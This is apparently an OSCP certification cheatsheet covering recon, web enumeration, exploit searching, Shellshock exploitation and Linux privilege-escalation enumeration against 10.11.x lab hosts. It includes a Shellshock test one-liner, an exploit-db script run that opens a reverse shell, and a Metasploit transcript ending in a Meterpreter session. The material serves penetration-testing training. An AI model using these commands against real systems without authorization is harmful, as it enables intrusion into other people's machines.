# OSCP
OSCP Exam Cheatsheet.

# Index

- [Introduction](#introduction) 

# Content

### PREPARATION
Kali Wordlists: `/usr/share/wordlists`  
SecLists: https://github.com/danielmiessler/SecLists

Useful Tools:
```bash
$ enum4linux [ target_ip ]	# Enumerate Windows / Samba (SMB) hosts.

```

### RECON
Scan network range for valid IPs/hostnames:  
```bash
i="0"
while [ $i -lt "255" ]
do nslookup 10.11.1.$i 10.11.1.220 | grep -v "NXDOMAIN" | grep name
	i=$[ $i+1 ]
done
```

Nmap port scans:
(NOTE: Heavy scanning may result in ports being filtered/closed - wait <15 minutes to be unbanned)
```bash
$ nmap 10.11.1.71 --top-ports 20 --open	# Top 20 TCP ports scan on initial box
$ nmap 10.11.1.71 -p- -sV		# Complete TCP port scan + service banner grab on each box:
```

Services enum:
* SSH (22): Fingerprint server/OS, SSH key
* HTTP (80|8080): Curl for HTTP header
* Telnet (23):
* SMTP (25):
* Service (port):

For each service, check available Nmap scripts:
```bash
$ ls -l /usr/share/nmap/scripts/*ssh*
```

Summarise your recon findings on the target:
* IP / DNS?
* OS?
* Ports (TCP / UDP)?
* Services / Applications?
* Which is the best entry point so far?
* Prioritised list of attack vectors:
	* Explore the web application.
	* Search for vulnerabilities in the known services & applications.
	* Brute force SSH with common & weak credentials.


### DEEPER RECON (SERVICE-LEVEL) - WEBAPP EXAMPLE

Scripts:
```bash
$ curl -i -L 10.11.1.71 						  # Follow re-directs
$ curl 10.11.1.71 -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//' # Internal/external links
$ gobuster -u http://10.11.1.71/ \					  # Directory brute-force
	   -w /usr/share/seclists/Discovery/Web_Content/common.txt \
	   -s '200,204,301,302,307,403,500' -e
$ gobuster -u http://10.11.1.71/cgi-bin/ \				  # 2nd directory brute-force
	   -w /usr/share/seclists/Discovery/Web_Content/cgis.txt \
	   -s '200,204,403,500' -e
```

Other things to check:
* robots.txt
* social media
* source code (if app is based on open-source code)

Re-evaluate attack surface:
* Any new findings to add to our list of attack vectors?

### FINDING AN EXPLOIT TO USE

Nikto webapp scanner:
```bash
$ nikto -host 10.11.1.71
```

Searchsploit (exploit-db):
```bash
# BASE EXAMPLE
$ searchsploit [options] [search_term1] [search_term2] . . . [search_termN]

# APACHE 2.4.8 EXAMPLE
$ searchsploit apache 2.4 | grep -v '/dos/'
$ searchsploit apache 2.x | grep -v '/dos/'

# APACHE | CGI
$ searchsploit apache cgi | grep -v '/dos/'

# WORKING EXPLOIT CODE FOUND IN:
/usr/share/exploitdb/platforms/linux/remote/34900.py
```

Nmap:
```bash
$ ls -l /usr/share/nmap/scripts/*shellshock*
```

Other areas to find exploit code:
* Google Shellshock POC
* Google one-liners from github

If no good attack vectors / exploit can be found, try a different or more comprehensive wordlist for subdirectory brute-forcing or use a webapp scanner to poke harder at the system.

### USING EXPLOIT CODE

METHOD #1: MANUAL
```bash
env X='() { :; }; echo "CVE-2014-6271 vulnerable"' bash -c id	# Src: Github one-liner
```

METHOD #2: EXPLOIT-DB
```bash
$ cp /usr/share/exploitdb/platforms/linux/remote/34900.py alpha.py
$ python alpha.py payload=reverse rhost=10.11.1.71 lhost=10.11.0.31 lport=4444 pages=/cgi-bin/admin.cgi
10.11.1.71>
```

METHOD #3: METASPLOIT (NOT PREFERRED)
```bash
$ systemctl start postgresql
$ msfdb init
$ msfdb start
$ msfconsole
msf > search shellshock
msf > use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf exploit(apache_mod_cgi_bash_env_exec) > show options
. . .
msf exploit(...) > run
[*] Started reverse TCP handler on 10.11.0.42:443
[*] Command Stager progress - 100.46% done (1097/1092 bytes)
[*] Transmitting intermediate stager...(106 bytes)
[*] Sending stage (826872 bytes) to 10.11.1.71
[*] Meterpreter session 1 opened (10.11.0.42:443 -> 10.11.1.71:34930) at 2018-12-18 13:53:55 +1100
meterpreter > exit
. . .
msf exploit(apache_mod_cgi_bash_env_exec) > rerun
```

You will now have reverse shell.

### PRIVILEGE ESCALATION - ENUM

Get a proper shell:


Linux privesc:
* https://github.com/rebootuser/LinEnum (automated scan)
* https://tools.kali.org/vulnerability-analysis/unix-privesc-check (Kali tool)
* https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/  

Windows privesc:
* https://github.com/azmatt/windowsEnum (automated scan)
* https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md
* http://www.fuzzysecurity.com/tutorials/16.html

Questions to ask:
* What user files do we have access to?
* What configurations do we have access to?
* Any incorrect file permissions?
* What programs are custom? Any SUID? SGID?
* What's scheduled to run?
* Any hardcoded credentials? Where are credentials kept?

Privesc Enum:
```bash
# OS? Version? Architecture?
$ cat /etc/*-release
$ uname -i
$ lsb_release -a (Debian)
 
# Who are we? Where are we? What are our sudo privileges?
$ id
$ pwd
$ sudo -l
 
# Other users? Which ones have a valid shell?
$ cat /etc/passwd
$ grep -vE "nologin|false" /etc/passwd
 
# Services running on the box? Network services running?
ps aux
netstat -antup
 
# Whats installed? Kernel?
dpkg -l (Debian)
rpm -qa (CentOS / openSUSE)
uname -a
```

Summarise possible attack vectors / vulnerable services to escalate privileges.

### PRIVILEGE ESCALATION - FINDING EXPLOIT

Use information gathered from enumeration stage to find an exploit for vectors / vulnerable services in your list.









